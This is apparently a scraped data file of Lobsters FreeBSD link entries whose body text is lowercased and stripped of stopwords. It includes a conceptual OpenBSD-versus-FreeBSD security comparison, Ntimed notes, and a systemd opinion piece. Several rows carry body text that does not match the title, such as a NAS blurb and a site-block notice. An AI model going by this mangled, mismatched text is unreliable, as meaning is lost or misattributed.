configuration port done file located usrlocaletc base system configuration kept etc usual make easy recognized whether application part base system port help keep filesystem clean final thought freebsd linux many quality common coming linux background important recognize understand way differ path diverge system advantage proponent either camp point reason choice made treating freebsd operating system instead insisting viewing linux lens help avoid fighting o generally result better experience hope fairly good understanding difference look move forward new running freebsd server good next step may guide getting started freebsd
619,Lobsters,freebsd,FreeBSD,anoncvs (1996),http://marc.info/?l=freebsd-hackers&m=94346786026588&w=2,anoncvs,,
620,Lobsters,freebsd,FreeBSD,bsdtalk249: Interview with Scott Long of Netflix about their FreeBSD-based local caching appliances,http://bsdtalk.blogspot.com/2014/12/bsdtalk249-netflix-update-with-scott.html,interview scott long netflix freebsdbased local caching appliance,,netflix update scott long meetbsd california file info ogg link http
621,Lobsters,freebsd,FreeBSD,phk's ntpd replacement: Ntimed,https://github.com/bsdphk/Ntimed,phk ntpd replacement ntimed,ntimed network time synchronization read http phkfreebsddktime yell phk ntimedorg happens next compile test happens run packet trace simulation tweaking parameter thanks acknowledegments,ntimed network time synchronization previewearlyaccesalphabuzzwordofthetimes release new fo project written gradually take world networked timekeeping first step ntp protocol client daemon ntimedclient synchronize system clock set ntp server catch support slave server refclocks protocol ptp added subject interest skill time money overall architectural goal every fo project claim follow simplicity quality security etc etc tend think stick little bit closely work sponsored linux foundation partly response heartbleed fiasco studying line sourcecode ntpd concluded could salvaged would economical much faster far efficient start scratch ntimed result take code compile run steer computer clock going encourage production yet unless know preview release soonish full productionready release package favourite operating system yet willing read csource code figure printout mean care quality timekeeping quality programming would love hear feedback review idea read maintain blogofsorts project http phkfreebsddktime find information theory practice thinking try bridge gap update typically happen weekend work ntimed yell poulhenning kamp please send email phk ntimedorg happens next plan first productionready release hopefully o release adopt ntimed first alternative later replacement ntpd client application intent start manage entirely new fo project around ntimed harlan network time foundation agreed adopt ntimed run inwithparallel ntpd project something still need flesh detail compile pull source code machine want play sh configure make fast nt amazing slow thing nt nt go hunting different fortran compiler c code test stop ntpd running ntimedclient tmpsomefile somentpserver someotherntpserver synchronize clock server preview release process daemonize background tmpsomefile argument tell write full blowbyblow tracefile analysis debugging something go wrong going ask copy tracefile happens run second clock stepped necessary final version process daemonizes background point trust clock good next second pll eliminate residual phase error point time computer clock good millisecond depending quality server minute pll integrated frequency error computer crystal pll start stiffen minimize amount steering necessary keep clock aligned server using distant distant server take longer time pll stiffens packet trace simulation also run program two way ntimedclient pollserver somentpserver someotherntpserver steer clock query server steered clock ntpd running time default terminates second control one hour etc save output file redirect stdout use filename use input simulation run ntimedclient simclient filename tmp run python plotgenpy finally get nice picture look gnuplot load tmpg tweaking parameter parameter examined tweaked p argument p give list available parameter get information parameter p parametername set parameter nondefault value p parameternamenewvalue everything parameter yet unused dummy parameter make sure macromagic work thanks acknowledegments first foremost big thanks professor dave l mill thanks first timenut internet called back thanks allround pleasant fellow work thanks adopting nanokernel refclockoncore particular thanks lending cantankerous loranc receiver world ever seen time life badly needed distraction keep sane big thanks linux foundation realizing ntpd dire strait dave mill retired thanks giving money free hand thought best even though bsdguy thanks harlan stenn keeping ntpd flame burning however stormy last decade trust network time foundation take good care ntimed future taken care ntpd past special wave hat john r vig famous quartz crystal tutorial finally shoutout thanks timenuts general tom van baak particular jolly interesting company people happen care nanosecond leap second chokering antenna finer point sc v atcut quartz crystal phk
622,Lobsters,freebsd,FreeBSD,Security : OpenBSD vs FreeBSD,http://networkfilter.blogspot.co.uk/2014/12/security-openbsd-vs-freebsd.html,security openbsd v freebsd,theo de raadt presentation document source github hard work hardenedbsd security enhancement recently november unmaps entire allocation strlcpy strlcat openbsd slide article sophos nakedsecurity article linked hackfest randomization occasion said security chapter libressl heartbleed page openssh explained openssh paper document capsicum capsicum used systrace freebsd gateway hardening jail intrusion detection snort freebsd handbook recently network randomness paper patch page performance greatly improve performance collapse time faster future pf freebsd one bsdnow x flaw certain people vulnerability remotely exploitable integer overflow flaw bug existed year openvpn,introduction openbsd freebsd great o admire use openbsd considered secure since main goal freebsd tweaked pretty well hardened well depending forum ask different opinion fact o secure asking question one globally better better different meaning depending context need isp router database server home gateway desktop system storage server appliance etc enterprise major o upgrade every month every year doable others possible also depends one need performance streaming netflix security top priority redundant firewall everyone need different o highly useful strictly focus security freebsd compare openbsd securitywise follows dig memory protection system network security feature default box security purpose give unbiased fact compare point point o trying find best o discredit love use let u try find integrated security feature o visit continues summary memory protection security issue o facing overflow buffer heap vulnerability exists o service application possible attacker exploit make denial service remotely executes code payload see endless discovering vulnerability witch often end remote code execution critical issue openbsd freebsd defense following information extracted theo de raadt presentation document well source random stack gap first problem default given program always stack address therefore find buffer address overflow appropriate exploit lead classic buffer overflow potential remote code execution network related service example buffer overflow due common programming error bound check lacking instance filling byte buffer byte data supplied external source without checking discarding supplied data maliciously constructed inject executable code process take control vulnerable process rootadmin right even worse solution implemented openbsd place variable memory gap stack consequently time given program run stack never start address thus buffer non fixed address easily implemented kernel render stack overflow difficult enabled default aware similar random stack gap memory protection freebsd wx write xor execute another problem memory exploit buffer overflow address space memory writable executable therefore possible writeinject executable code vulnerable process stack use vulnerability execute code nt possible execute writable area nt possible write executable area exploitation would much harder solution implemented openbsd wx policy first step render stack non executable move away stack top page signal trempoline sigtramp move done perprocess random address stack rendered non executable would seem great however stopping would enough indeed shared library used process still writableexecutable page also additional object executable require global offset table got procedure linkage table plt c constructor ctors c destructors dtors fix openbsd give got plt non writable page ctors dtors move got thus becoming non writable end page executable writable another trick readonly string pointer stored text segment executable moved elf rodata segment readonly finally atexit function modified contain writable function pointer anymore end overall wx policy beautiful piece work enabled default freebsd side nonexecutable stack enabled default system elf sysctl parameter find much information implementation guess mark stack nonexecutable nx bit aslr exploiting flaw requires point locate use memory address particular piece code interest aslr job randomize position memory area stack heap library way every time process start library wo nt loaded address making job difficult attacker predict target adresses instance exploit returntolibc bypass nonexecutable stack protection would stopped aslr library address random openbsd introduced aslr enabled default system modified implemented randomize shared librairy mapping base address mapping order mapping time process run library mapping address mapping order differents position independant executable pie added aslr pie make main base program randomly loaded well shared librairy run main program new address another feature used openbsd aslr randomized mmap function call map file device memory time process make call unless explicitely requiring fixed address result random address adding yet memory randomization similar feature random malloc function used manually allocate dynamic memory tiny malloc call randomly allocated within special bucket page larger one rely random mmap malloc always randomize addition guard page enabled mallocconf g option malloc feature enabled default yet program well coded bugging case would still enough free call delay also random december freebsd aslr available yet oliver pinter started working aslr side shawn webb joined later help work matter follow work github march shawn webb written hard work freebsd aslr implementation also together created project hardenedbsd based freebsd meant bring security enhancement freebsd shawn webb highlight current aslr implementation freebsd us stackgap randomization weak working true stack randomization stronger aslr also really worth mentioning actively working wx true stack randomization vdso virtual dynamic shared object randomization work planned upstreamed freebsd stack protector stack smashing protection another way defend buffer overflow introduce commonly called canary canary random numberflag inserted stack runtime afterwards canary checked value changed mean stack overwritten program terminated openbsd stack protector implementation also reordering stack string integer pointer move string closer canary integer pointer farther freebsd memory protection mechanism exists called stack smashing protection ssp propolice canary called guard inserted stack ssp exists since freebsd applied base system first recently november mean third party package finally also benefit ie apache nginx postfix mysql etc ssp also reorder local variable pointer apparently propolice enabled sysctl disabled default securitybsdstackguardpage sysctl description insert stack guard page ahead growable segment would match propolice behavior openbsd additional mechanism called stackghost available weaker stack protector overhead us unique hardware feature sparc architecture protection freebsd null page mapping protection enabled default sysctl prevents user call mmap null page found direct mention mapping openbsd ted unangst kind enough inform openbsd generally prohibits mmap null setting vmminaddress value greater configurable freebsd two memory corruption detection rather protection aimed debugging disabled default first one called redzone heap smashing detection aimed debugging kernel redzone using static canary value thus le useful propolice one memguard memory allocator used detect useafterfree exploit however compatible universal memory allocator used freebsd openbsd memory freeing implementation relies munmap unmaps entire allocation access freed memory lead crash openbsd also provides since openbsd strlcpy strlcat strlcpy strlcat function provide consistent unambiguous api help programmer write bulletproof code function help developpers avoid certain coding error leading buffer overflow freebsd introduced function freebsd sum memory protection available openbsd freebsd openbsd random stack gap wx got plt ctors dtors rodata atexit aslr pie mmap malloc stack protector stackghost munmap strlcpy strlcat freebsd nx propolice null page mapping strlcpy strlcat freebsd memory protection covered openbsd system wide wx stack protector aslr use love o must admit comparison hurt system security besides memory protection system security relies area randomness encryption privilege separation hardening jail securelevel instance single element provide strong security alone stacked together security gain huge explore essential component see two o perform various area following based openbsd slide another article sophos nakedsecurity article randomness randomness absolutly vital overall security system indeed many function feature rely upon key generation encryption algorithm random generator weak generate random number fact predictable would mean able break system guessing cryptographic key needed enter weak randomness dangerously lower security problem easy solve computer deterministics generating truly random number requires use external resource ethernet packet heat keyboard input hdd writes sound etc one source randomness well known devrandom device however called everywhere like chroot sometimes wise use like use random id network packet accessing devrandom locked area certain library every packet possible openbsd created function answer need create strong randomness pseudorandom generator basically seed exists file filesystem boot time used mixed clock source available interrupt passed kernel elf segment go trought cipher instead since october rcscript shutdown script create new seed periodic reseeds done instance certain amount time passed randomness used accross whole system aslr mmap malloc ssp process id thread packet id packet sequence number devrandom nat port allocation etc used well many o including android blackberry macos netbsd freebsd openbsd slide linked however blame freebsd rpc xid number generation based old algorithm number really random first subsequently incremented much information point even hackfest randomization occasion video would mean freebsd use particular xid generation also openbsd process id random default enabled freebsd sysctl kernrandompid take value modulus number greater random ie finally openbsd freebsd use strong random generator relied ted unangst openbsd said september implementation freebsd netbsd nt quite state art anymore detail point encryption strong randomness achieved use encryption every o encryption used encrypt file communication ssh ssl ipsec etc openbsd freebsd able swap encryption however enabled default openbsd freebsd follow security chapter one previous article one exciting news last month regarding crypto birth libressl created openbsd included openbsd libressl created replace famous openssl crypto tl library openssl suffered major security bug catastrophic heartbleed heartbleed vulnerability allowing anyone remotely read vulnerable system memory non intrusive way retrieve secret key usernames password able time test vulnerable system metasploit see horror username password plaintext first try event motivated openbsd team look openssl library saw much non sense like heartbeat feature useful dtls protocol udp implemented tl tcp coding mess decided fork openssl detailed information openssl badly coded page libressl cleaner code base fixing coding horror support also cipher brainpool chacha anssi port o hope see integrated used default freebsd future like openssh privilege separation often program need privileged operation operation made unprivileged user right even program need admin right starting opening socket example keep end mean operation done running higher privilege needed dangerous attacker successfully exploiting service gain admin right system come notion privilege separation best explained openssh one way separate privilege create two process parent one privileged right also called monitor unprivileged child also called slave child run unused user chrooted varempty parent receives first connection request key exchange authentification delegated forked child communicates parent trough secure interface parent decides authentication sucessful informs child authenticated another child forked wih authenticating user right handle new ssh session way exposed time attacker may try authenticate brute force exploit ssh child right chrooted simplified version technically parent accepting connection fork privileged child handling particular connection fork unprivileged one rest stay detail depth paper openbsd default us privilege separation many program found list document sshd bgpd ntpd ospfd dvrmpd spamd relayd ripd pflogd snmpd hostapd smtpd tmux ypldap ldpd syslogd mopd bind known program postfix qmail also see router following program root process unprivileged child ntpd sshd syslogd pflogd named openvpn even tcpdump addition chrooted may many program concerned router openvpn client configured run chrooted ovpn file line user openvpn group openvpn chroot varempty nt forget mkdir varemptytmp dnscryptproxy example program chroots user dnscrypt home directory drop root privilege called privilege revocation freebsd side privilege separation handled recent capsicum feature experimental optional freebsd enabled default since freebsd capsicum sandbox framework university cambridge computer laboratory supportedfunded google freebsd foundation capsicum allows program capability flag granting needed system call capsicum enabled program able make system call capability allow instance developper make application read file build capsicum call application request file readingopening capability consequently application misbehaves matter bug exploit wo nt able open socket make outbound network connection terminate process load kernel module etc application sandboxed file reading request delegated trusted component operating outside sandbox ensuring privilege separation capsicum used freebsd harden openssh builtin privilege separation explained capsicum used freebsd default following program tcpdump auditdistd hastd dhclient kdump rwhod ctld iscsid uniq difference however tcpdump freebsd although using capsicum still running root example capsicum used dhclient longer possible unprivileged process send udp packet arbitrary destination openbsd freebsd take privilege separation seriously system hardening strong memory protection place true randomness cryptography privilege separation core rule harden system o us securelevel run depending level openbsd freebsd various security measure enforced openbsd run default securelevel whereas freebsd run unsecure securelevel disabled default extract interesting security measure enforced securelevel securelevel secure mode devmem devkmem may written raw disk device mounted file system readonly system immutable appendonly file flag may removed kernel module may loaded unloaded panic trap forced securelevel highly secure mode effect securelevel raw disk device always readonly whether mounted settimeofday clocksettime may set time backwards close overflow firewall nat rule may altered available freebsd securelevel network secure mode securelevels allow use chflags enabling u put flag file make immutable changed moved deleted appendonly nodump wo nt backed dump utility unless full backup immutable chflags powerful even root modify protected file system securelevel lowered first rebooting single user mode modify etcsysctlconf highly secure mode network secure mode freebsd system locked even firewall rule altered powerful tool harden system well pain administer restricted server used wisely openbsd freebsd able enforce securelevels although enabled default freebsd o different security feature systrace openbsd mac jail freebsd systrace tool similar apparmor define policy stay learninginteractive mode long wish adapt systrace policy ready enforce systrace profile restrict system call program make therefore action program allowed example allow process make dns request localhost outside access etcappconf etcotherconf read file killing process etc generally making maintaining program system call enforcement policy time consuming tedious moreover complicated bigcomplex program may sudenly exhibit new behavior allowed policy access new file path update positive side well implemented systrace enforced program lot harder exploit abuse openbsd possible combine chroot systrace sandbox program freebsd provides side feature called jail jail separate environnement user process ip address hostname kernel host shared jail complete article freebsd jail check previous article freebsd gateway hardening jail intrusion detection snort basically everything installed running jail separated host access default jail restricted program inside simple ping sniff network interface traffic jail convenient way sandbox network related program ie web server way secure simple chroot without play appamor systrace policy host unreachable default course matter program jail freebsd openbsd still configured secured correctly ie load apache module need set appropriate file permission apply update etc jail convenient feature freebsd mandatory access control mac framework mac framework much documentation except freebsd handbook got lost first read basically mac framework provides security module seen freebsd plugins extend security feature o add new one let see concrete example right base system without loading mac module use sysctl prevent user see process network socket owned others useful isolate user globally prevent webserver example able return entire system process list attacker exploited however reason want prevent root see process socket user directly possible solution use macseeotheruidsko mac module loaded bootloaderconf line macseeotheruidsload yes new sysctls appear default enables isolation user except root effect without mac also sysctl default set prevent root seeing process socket sysctls appear allow fine tune exactly want exempting certains group policy way reason load mac module necessarily restrict root mac module exist mac bsd extended policy macbsdextendedko allows create filesystem firewall preventing instance account uid x access object yourpath mac port access control list policy acportaclko used allow unprivileged application bind specific privileged port ie http finally mac framework used put label object give clearance processesusers could create complex policy top secret information accessed object required clearance ensure depending mac module used higher clearance object access accessed lower clearance one openbsd freebsd great hardening feature highly valuable securelevel chflags systrace openbsd jail mac freebsd single security feature bullet proof used together talked greatly raise bar attacker network security randomness seen system security chapter true randoness critical many security area networking another area greatly benefit randomness pool lack randomness network stack led many attack past even recently linux kernel found system never initialize random seed secret value used generate tcp sequence number ip id ephemereal port able predict number attacker hijack connection close spoof tcp packet sent victim openbsd network randomness taken seriously randomness embedded pf firewall since pf included freebsd freebsd system using pf benefit randomness freebsd pf version older current openbsd pf version though later network randomness used pf pulled talked reliable randomness source use network stack avoid predictable network system randomness used ephemeral source port nat source port ip id tcp tcp timestamp dns query id ntp ntp protocol default sends host localtime check rtt round trip time sending random value done instead avoid information leakage using randomization additional icmp sequence number verification possible block known attack blind connectionreset blind throughputreduction icmp source quench blind performancedegrading icmp message fragmentation needed df bit paper list openbsd implemented countermeasure freebsd score upcomming fix third attack hope fixed nearly year later dns query id attack also avoided use pseudorandom dns query id random source port ipid attack idle scanning nmap scan tcp fragment injection avoided random ip id nat deadlock resolution protection requires random source port per destination ip port tcp modulation last issue extremely busy server much timewait state srcip srcport dstip dstport tuple reused making certain o stall affected connection like xp freebsd time said openbsd applied patch version find patch freebsd searching timewait changelogs version however thus may still affected openbsd clearly proactive protecting network stack improving pf firewall security reliability freebsd benefit nearly parameter using pf although security tweak done pf o network stack take time implemented freebsd pf magic traffic normalization feature provided pf scrub interesting feature broad effect used handle packet verification fragment spoofed traffic malformed packet used sanitize packet letting continue way also used enforce network policy packet flowing scrubbing enforce maximum segment size tcp packet enforce minimum ttl ip packet clear df bit ip packet randomize ip id packet host weak network stack statefully normalize tcp ttl side connection allowed reduce ttl statefully normalize tcp timestamp modulation randomize timestamp number statefully normalize tcp extended paw check extend security tcp sequence number bit fragment reassembly default advantage security increase outweights downside memory use indeed reassembly first fragment contains necessary header checked filtering rule fragment wo nt match rule state entry created fragment also seen attack past first fragment forged ip header look good fool firewall fully reconstructed packet could fact connect different port overlapping fragment attack also possible crash o reassembling malformed packet teardrop attack various fragment attack explained page pf also detect block spoofed packet builtin keyword antispoof instead creating rule drop network address seen x interface create rule drop spoofed traffic interface use simple feature one line pf block spoofed packet coming given interface lan network changed future ruleset wo nt need updated really simplifies ruleset spare job likewize urpffailed feature check packet coming interface address ie interface passed ie correct path address unicast reverse path forwading pf feature wo nt necessarily detail quickly synproxy protect server behind firewall syn flood attack o fingerprinting added rule make custom rule allow certains o ex openbsd ssh port router use routeto route packet interfacepath different default gateway instance tag packet create policy based filtering create trusted flow etc openbsd freebsd use pf therefore access feature however mentioned earlier freebsd old pf version openbsd currently openbsd version mean version later year unfortunate pf version performance greatly improve whereas high load performance collapse also new keywords feature syntax introduced match divertto keywords lot fix improvement done scrub modification nat rewrite various fix quick sample modification choosen show modification selected modification lot icmp tracking code rewritten shotcomings found scrub modification match keywork nat rewrite divertto keywork log subsystem rewritten performance feature make sure packet routing header create state dropping pf fixed crash pf ioctl fixed potential null dereference pf ioctl ahd added ack prioritization pf cleaned protocol checksum pf mpls make pf reassemble fragment improve pf direction check pf code evolves make code robust fix pf bug used outer header case lower pfconf frags limit avoids running mbuf cluster dealing lot ip fragment fixed pf sloppy state tracking missing half connection asymmetric setup ignoring state match icmp direction check reset pf fragment timeout time fragment arrives drop fragment packet reassembled within second pulling tcp option mbuf onto stack additional length check pf overflow happen resolved issue icmp traffic pf natto failed due incorrect checksum fixed pf icmpid bug affected icmp echo via nat nat nt change address fixed path mtu discovery pf using nat rdr see given work fix current freebsd pf version seems broken regarding current openbsd pf bleeding edge whereas freebsd version old version know fact started debate internet henning brauer said current pf time faster older version freebsd patched version multithreaded read would much work rework completely different pf version read thread future pf freebsd one originally heard legitimate interrogation bsdnow default security two opposite stance toward default security first considers nt matter security feature enabled default long enabled usually done server installed never touched second one considers enable everything lead mistake option forgotten wrongly configured also security feature option want enable expert need default gain lot time make mistake need expert usually adhere first logic although recognize second one completely relevant using openbsd freebsd must admit secure default touch many complex area seen gold standard box graphical overwiew seen far many caveat thought graphic interpreted make said opposite thing made choice otherwise could made looked better either o could added metric score accurately represent whole o security added color make reading easier make o look good bad security tool like systrace mac great nt know use useless chosen privilege secured default could colored green available security even disabled default security whole o ie administration performance package install updateupgrade hardware support community etc may nt care hence memory protection o graphic cool fun however security whole process sume green red graphic overview lacking detail ie openbsd useafterfree protection munmap present freebsd said someone back room seems protest saying dodging flying egg ah ok understand matter disabled default long enable dodging egg ok nt care got know building libressl system deal linked package pf good enough ok ok go nt hit enable disabled default protection either sysctls random process id ssp manual step swap encryption securelevel libressl port nt use sparc disregard bit perfect rpc xid implementation final security could perfectly fit need providing point view source code audit openbsd developpers constantly code auditing instead writing new code feature code auditing allows finding bug sometimes new class bug way working put great priority code quality ultimately end better security indeed adding new feature program never looking back security advisory knock door best way make secure o security problem fact first place simple bug facing bug always obvious exploitable create vulnerability last case even harder gauge exploitation feasabilityprobability simple however fix bug found way later discovered lead security vulnerability o already fixed problem even exists also kind bug even new class bug discovered code previously audited audited looking new coding mistake proactively looked fixed bug create critical vulnerability exist year discovered wordpress x flaw year could allow attacker execute administrative action website administrator loaded page containing rogue commentcode heartbleed bug existed year certain people suspect intelligence agency well aware using poodle vulnerability existed year since used read encrypted communication window vulnerability remotely exploitable existed year could used take window computer lzo compression algorithm integer overflow year used many software openvpn instance flaw may lead remote code excution certain condition another openssl flaw discovered existed year could used read tl encrypted communication shellshock bug existed year used many different system program webservers even openvpn affected example show currently o bug exploitable exist left untouched wo nt magically fix eventually become critical vulnerability allowing remote exploitation year may already noticed publicily know vulnerability known secretely used others proactively aggressively auditing source code bug smart way dramatically increase security one openbsd strongpoint part secure default philosophy conclusion consider memory protection openbsd master area random stack gap wx got plt ctors dtors rodata atexit aslr pie mmap malloc stack protector stackghost strlcpy strlcat freebsd severely lagging behind hope project hardenedbsd bring aslr freebsd soon possible memory exploitation probably common remote exploitation technique subject trifled regarding system hardening openbsd freebsd interesting regard way provide different tool make use securelevel chflags make use strong randomness cryptography openbsd privilege separation default systrace freebsd provides also privilege separation capsicum add mac framework famous useful jail pf firewall amazing hope freebsd follow regularily openbsd pf version instead staying year behind said o secure one choose easy question indeed focus memory protection openbsd seems way go however like need jail wo nt openbsd although use systrace instead thing opposite could say aware weaker memory protection freebsd use jail isolate network service wonder would best system memory exploitation hard le chance success low probability host compromise system memory exploitation probable host reach exploitable service jailed alone highly vary depending software installed associated risk single postfix v apache mysql phpmyadmin drupal webserver v router another point view webserver compromised client data matter host compromised already lost case may prioritize memory protection openbsd add parameter ease administration lts version support team work everyone knowlearn new system team best o highly individual security one important parameter especially nowadays internet like unmerciful war zone anything else vulnerability far reaching consequence hit u many time per year everyone hacking everyone country state included however understand o choose keep simple simplicity one key security one area openbsd shine secure default design however could argued making jail easier stronger creating maintaining systrace policy perfectly understand jail sure systrace choose freebsd many argument prove o best particular order necessarily security zfs ssd memory protection jail pf journaledsoftupdates filesystem systrace capsicum mac etc end openbsd freebsd strongpoints disadvantage really wish continue improve eventually borrow best idea project like libressl hardenedbsd need support improve nt hesitate help possibility wish secure peaceful soon year thank reading updated december freebsd ssp openbsd mallocnull random free hardenedbsd additional information defaulttweaked graphic link
623,Lobsters,freebsd,FreeBSD,Steam on PC-BSD - How to Get Wine Running 3D Games,http://blog.pcbsd.org/2014/12/steam-on-pc-bsd-how-to-get-wine-running-3d-games/,steam pcbsd get wine running game,na,na network attached storage na unified storage system enables multiple user client device access data via protocol like nfs unix smb window afp apple iscsi fibre channel na system typically combine multiple disk drive create highly redundant storage protect important data
624,Lobsters,freebsd,FreeBSD,ruBSD 2014,https://events.yandex.ru/events/yagosti/rubsd14/,rubsd,приглашаем на rubsd вторую российскую техническую конференцию по операционным системам семейства bsd мероприятие посвящено новым технологиям в мире bsd и актуальным способам применения bsdсистем в этот раз мы поговорим про высоконагруженные вебсервера zfs и iscsi вернёмся к управлению пакетами embeddedсистемам и практике использования декабря года в московском офисе яндекса состоится rubsd вторая российская техническая конференция по операционным системам семейства bsd,приглашаем на rubsd вторую российскую техническую конференцию по операционным системам семейства bsd мероприятие посвящено новым технологиям в мире bsd и актуальным способам применения bsdсистем в этот раз мы поговорим про высоконагруженные вебсервера zfs и iscsi вернёмся к управлению пакетами embeddedсистемам и практике использования участие бесплатное но зарегистрироваться необходимо количество мест ограничено если вы зарегистрировались но не сможете прийти пожалуйста сообщите нам об этом декабря года в московском офисе яндекса состоится rubsd вторая российская техническая конференция по операционным системам семейства bsd
625,Lobsters,freebsd,FreeBSD,FreeBSD: the next 10 years,http://www.slideshare.net/iXsystems/jordan-hubbard-free-bsd-the-next-10-years,freebsd next year,sify please click,sify web page blocked requested url blocked per direction received department telecommunication government india url rating web page reevaluated please click powered sify cleanconnect cloud based network security service
626,Lobsters,freebsd,FreeBSD,FreeBSD Foundation receives $1M donation from WhatsApp founder,http://freebsdfoundation.blogspot.com/2014/11/freebsd-foundation-announces-generous.html,freebsd foundation receives donation whatsapp founder,website donate,freebsd foundation pleased announce received donation jan koum ceo cofounder whatsapp mark largest single donation foundation since inception almost year ago serf another example someone using freebsd great success giving back community find jan reason donating process working together team decide best use gift serve freebsd community plan combine financial investment ensure effect donation felt many year come acceleration foundation growth new capability service freebsd tremendous impact world mission increase impact educational outreach advocacy community support technical investment information serve area found website donation generosity donated year shattered million dollar fundraising goal mean stop fundraising effort increasing size diversity donor pool ensure stable consistent funding stream support freebsd project please help u continue grow freebsd reach impact world donate today update following contains full text jan facebook post last week donated one million dollar freebsd foundation support open source operating system helped million programmer pursue passion bring idea life actually one people started using freebsd late much money living government housing way freebsd helped lift poverty one main reason got job yahoo using freebsd operating system choice year later brian set build whatsapp used freebsd keep server running still announcing donation shine light good work done freebsd foundation hope others also help move project forward benefit freebsd continue give people opportunity gave lift immigrant kid poverty help startup build something successful even transformative jan koum
628,Lobsters,freebsd,FreeBSD,"The Book of PF, 3rd edition, first copy signed by author, auction for OpenBSD",http://bsdly.blogspot.com/2014/10/the-book-of-pf-3rd-edition-is-here.html,book pf edition first copy signed author auction openbsd,absolute openbsd edition auction book pf edition openbsd openbsd apple treat gift open source openbsd pf example book pf edition http http donation order openbsd foundation donation page,continuing tradition started michael lucas absolute openbsd edition auction auctioning first signed copy book pf edition updated ebay auction concluded final bid u see today took delivery two box full book pf edition author copy likely first arrive norway well north american received copy early last week course somewhere range hard impossible verify anyway long anticipated book selfie larger size available writing process subsequent editing proofing step dear reader know appreciate took significantly longer expected edition book good luck become available release openbsd target original plan sync openbsd release nobody surprise mine process took longer wanted regular reader know already main reason edition exists openbsd new traffic shaping system replace year old experimental altq code book date openbsd early preorderers received disk already hear give hint migrate new queue priority system also note altq longer part openbsd version course various improvement openbsd since version year version referenced second edition see update reflecting least change various part book even openbsd edition improvement previous version taken care include information relevant freebsd netbsd well significant difference system noted text example could tempting include specific reference apple operating system well made decision early stay free system written something pf apple book see call testing article apple treat gift open source openbsd pf example field note main item edition limited time book pf auction chance first author signed copy book pf edition auction http look extending auction period odd reason max offered day bid successful one strongly urge make direct donation amount openbsd foundation instead signed book fill missing space name amount update cest whatever stopped ebay listing auction resolved auction http look extending auction period odd reason max offered day bid successful one strongly urge make direct donation amountto openbsd foundation instead first signed copy incidentally also first copy wife picked first box opened come inscribed handwriting title page name winner book pf auction thank supporting openbsd cad usd eur amount donation bergen date signature reference handwriting pretty sight best time lucky winner receive book entirely reasonable able dechipher scrawl think chance actually winning worth considering please head openbsd donation order page spend bos hard earned cash speaking schedule set upcoming month reasonable chance attend least bsd event near future see update auction concluded november bill allaire successful bidder paid via paypal almost inevitably ebay auction immediately sent signed book two day later lady post office said package took week turn bill mailbox took day paypal finally made fund available bit wrestling possibly intuitive someone else paypal interface transferrred amount openbsd foundation today paypal course racked fee incoming outgoing degree think fee paid ar considered competitive whoever coined phrase giant vampire squid describe u bank must trying desperately make traditional u bank sound nice cuddly unsuccessful bidder urge head openbsd foundation donation page make donation equal highest bid
629,Lobsters,freebsd,FreeBSD,Virtual Machine rc script for FreeBSD and bhyve,https://github.com/michaeldexter/vmrc,virtual machine rc script freebsd bhyve,vmrc http vmrcbsdlv editor callfortestingorg,vmrc vmrc virtual machine rc script managing bhyve xen virtual machine home page http vmrcbsdlv see vmrcknownissuestxt file uptodate status information developer note end vmrcinstructionstxt work progress please consider submitting question feature request prior patch submit pull request note github combine request accepted group inadvertently make inseparable thus unacceptable arguably defeating entire purpose git one workaround submit request different local branch thank helping test bhyve xen vmrc michael dexter editor callfortestingorg
630,Lobsters,freebsd,FreeBSD,You have your Windows in my Linux,http://www.infoworld.com/d/data-center/you-have-your-windows-in-my-linux-249483,window linux,systemd debate exceedingly loud protest red hat forced enterprise also infoworld paul venezia choose side linux divide review rhel land jolt beginner guide docker latest practical data center info news check infoworld data center newsletter freebsd proponent long time stranger thing happened window linux infoworldcom paul venezia deep end blog infoworldcom twitter,although think systemd debate decided favor systemd exceedingly loud protest message board forum post wrote past two week would indicate otherwise seen many declaration victory systemd red hat forced enterprise release rhel nt think easyyes saw systemd rise fedora knew going part rhel saw systemd inclusion ubuntu debian certain segment linux user base rest u run big linuxbased service application stack centos rhel possibly derelict speaking disdain systemd development came pas late speak also infoworld paul venezia choose side linux divide review rhel land jolt beginner guide docker latest practical data center info news check infoworld data center newsletter see one common thread heated discussion systemd vocal proponent systemd seem singular desktop user whereas server admins architect lean way exchange one recent post showcase user zinckidd comment bsd looking better better reply adam jorgensen note good luck running laptop due respect adam going run rhel laptop either going run server vastly different workload nobody talking laptopsin another post prosystemd commenter luya tshimbalanga disparages runlevels unclear later say basic runlevels part every unix derivative somehow complex asked runlevels unclear state new generation administrator user asked already familiar init number term future administrator wo nt without documentation init number arbitrary mean nothing nt mean pick indicative larger trend toward user appear believe reading manual learning o internals bad plaster mumbojumbo nice sleek completely opaque management layer example systemdi believe thinking pretty much line microsoft train thought back early enduser mindset nothing server certainly enterpriselevel server learning hard mentality damaging linux service platformto pick another element comment suddenly uptick interest freebsd freebsd proponent long time run freebsd server two decade heard rumbling veteran admins exploring possibility migrating service freebsd instead linux due systemd believe idea may find leg time pass especially fervor docker suddenly people discovered freebsd jail long able might trigger industrialsize changesit could well systemd schism result split along usecase line linux get laptop freebsd get server perhaps see rise new pure linux server distribution jettisons systemd desktop element altogether along systemd dependency found gnome course gentoo slackware user believe already using nowthe beauty linux open source software general would perfectly acceptable course action part played right red hat likely made misstep forcing systemd rhel outcome battle may clarity within linux distribution favor desktop server continue using systemd favor server desktopthe downside another plumbing framework account packaging software use multiple distribution nothing new time right new player enter game offer alternative rhel juggernaut know maybe suse make comeback stranger thing happenedgo ahead kid spackle unsightly runlevel stuff paint init cron pam login put along dbus make pretty whisper sweet nothing taken care wo nt read manual learn silly commandline stuff tune distribution desktop workload go reinvent windowsultimately systemd look like rest u prettythis story window linux originally published infoworldcom read paul venezia deep end blog infoworldcom latest business technology news follow infoworldcom twitter
631,Lobsters,freebsd,FreeBSD,"Facebook is hiring to make ""the Linux kernel network stack rival or exceed that of FreeBSD""",https://www.facebook.com/careers/department?req=a0IA000000Cz53VMAR,facebook hiring make linux kernel network stack rival exceed freebsd,notice,इन
